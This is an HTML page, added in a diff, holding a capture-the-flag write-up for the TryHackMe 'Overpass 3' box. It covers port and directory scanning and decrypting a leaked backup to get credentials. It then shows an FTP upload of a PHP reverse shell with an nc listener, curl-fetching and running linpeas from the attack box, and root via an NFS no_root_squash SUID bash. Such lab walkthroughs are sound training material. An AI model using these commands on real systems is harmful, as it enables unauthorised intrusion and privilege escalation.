@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe-Overpass3-Hosting-WriteUp</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html, body {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white; /* Yazı rengini beyaz yapar */
+        }
+        
+        body {
+            background-image: url('pics/bg5.jpg'); /* Arka plan resmi */
+            background-size: cover; /* Resmi ekran boyutuna göre ayarlar */
+            background-position: center; /* Resmi ortalar */
+            background-repeat: no-repeat; /* Resmin tekrarlanmasını engeller */
+            background-attachment: fixed; /* Arka planın sabit kalmasını sağlar */
+        }
+
+        .overlay {
+            background: rgba(0, 0, 0, 0.7); /* Siyah bir örtü ekler */
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.3); /* Kırmızı yarı saydam bir arka plan */
+            border-radius: 10px;
+        }
+        
+        .photo-container {
+            margin: 10px 0;
+        }
+        
+        .photo-container img {
+            width: calc(100% - 20px); /* Kenarlarda 20px boşluk bırakır */
+            height: auto; /* En-boy oranını korur */
+            object-fit: cover;
+            border-radius: 0; /* Köşe yuvarlamasını kaldırır */
+            margin: 10px; /* Boşluk ekler */
+        }
+        
+        .photo-container p {
+            font-size: 18px;
+            line-height: 1.5;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .code-block {
+            position: relative;
+            background-color: #ffffff;
+            padding: 10px;
+            border-radius: 5px;
+            width: calc(100% - 20px); /* Tam genişlik */
+            margin: 10px; /* Boşluk ekler */
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+        }
+        
+        .code-block button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px; /* Buton yazı boyutunu ayarlar */
+        }
+        
+        .code-block pre {
+            margin: 0;
+            padding: 10px;
+            width: 100%; /* Tam genişlik */
+            white-space: pre; /* Satır kaymasını engeller */
+            font-size: 14px; /* Kod yazı boyutunu ayarlar */
+            color:black;
+            font-family: Arial, sans-serif;
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+        }
+        
+        .code-block pre code {
+            display: block;
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+            padding: 10px;
+            white-space: nowrap; /* Satır kaymasını engeller */
+        }
+        
+    </style>
+</head>
+<body>
+    <!--<div class="overlay"></div>  Siyah örtü -->
+    <div class="container">
+        <div class="photo-container">
+            <p><a href="https://tryhackme.com/r/room/road">Link to room on TryHackMe.com</a></p>
+            <p>Welcome to my TryHackMe-Overpass3-Hosting-WriteUp! first we start enumeration with rustscan with this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>rustscan -a 10.10.70.140 -- -sC -sV</code></pre></div>
+            <img src="pics/o1.png" alt="Image 1">
+            <p>we see three ports are open and there is no useful exploit for this versions of services. So we keep enumerating with gobuster and use this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>gobuster dir -u http://10.10.70.140/ -w common.txt -x php,html,md,js,txt</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/o2.png" alt="Image 2">
+            <p>so we see there is a directory called /backups. when we check it we see there is a file called backup.zip and inside of it there is a private key and a encrypted file</p>
+        </div>
+        <p></p>
+        <div class="photo-container">
+            <img src="pics/o3.png" alt="Image 3">
+            <p>to decrypt file we use these commands:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>unzip backup.zip</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>gpg --import priv.key</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>gpg --decrypt-file CustomerDetails.xlsx.gpg</code></pre></div>
+            <p>after that in original file we find some credentials:</p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/o4.png" alt="Image 4">
+            <p>when we try to login ftp with user paradox we see we can login and we can upload file. with this vulnerabilty we can get a reverse shell. you can find reverse shell in here <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a> . so first we upload our .php file after that we start a listener on our attackbox with this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>nc -lvnp 443</code></pre></div>
+            <p>when we visit /shell1.php in browser we have a reverse shell:</p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/05.png" alt="Image 5">
+        </div>
+        <div class="photo-container">
+            <img src="pics/o6.png" alt="Image 6">
+            <p>Wee see we are in as user apache. After that we login as user paradox. For to get some information about the system we upload linpeas.sh to the system yo can find it in here: <a href="https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh">https://github.com/peass-ng/PEASS-ng/releases/download/20240421-825f642d/linpeas.sh</a> . To upload this script fisrt we start a simple http server in our attackbox with this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 -m http.server 7000</code></pre></div>
+            <p>after that in target we use these commands:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>cd /dev/shm</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>curl http://10.17.52.17:7000/linpeas.sh -o linpeas.sh</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>chmod +x linpeas.sh</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>./linpeas.sh</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/o7.png" alt="Image 7">
+            <p>So linpeas says there is a nfs export file. After some research i found out that we need a private ssh key and nfs file is only accessible locally. First we generate a ssh key then paste it to /home/paradox/authorized_keys </p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/o8.png" alt="Image 8">
+            <p>After that we run this commands on our attackerbox for port forwarding:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>chmod 600 sshkey</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>ssh -L 2049:localhost:2049 paradox@10.10.70.140 -i sshkey</code></pre></div>
+            <p>after that we mount the share with these commands:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>mkdir nfs</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>mount -t nfs 127.0.0.1: nfs</code></pre></div>
+            <p>and then we see there is second flag and privatekey of james.</p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/09.png" alt="Image 9">
+            <p>then we see private key has no password and we can login as user james</p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/o10.png" alt="Image 10">
+            <p>for to find our first flag we use this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null</code></pre></div>
+            <p>to be root we use nfs misconfiguration. first in target we use this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>cp /usr/bin/bash /home/james</code></pre></div>
+            <p>after that in our attackbox we go to mounted directory and use these commands: </p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>chown root:root bash</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>chmod +s bash</code></pre></div>
+            <p>then when we look at bash binary in target it should look like this for to execute</p>
+        </div>
+        <div class="photo-container">
+            <img src="pics/o11.png" alt="Image 11">
+            <p>and finally we use this command to be root:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>./bash -p</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/o12.png" alt="Image 12">
+            <p>and done. We are root. Thanks for reading!</p>
+        </div>
+    </div>
+</body>
+</html>
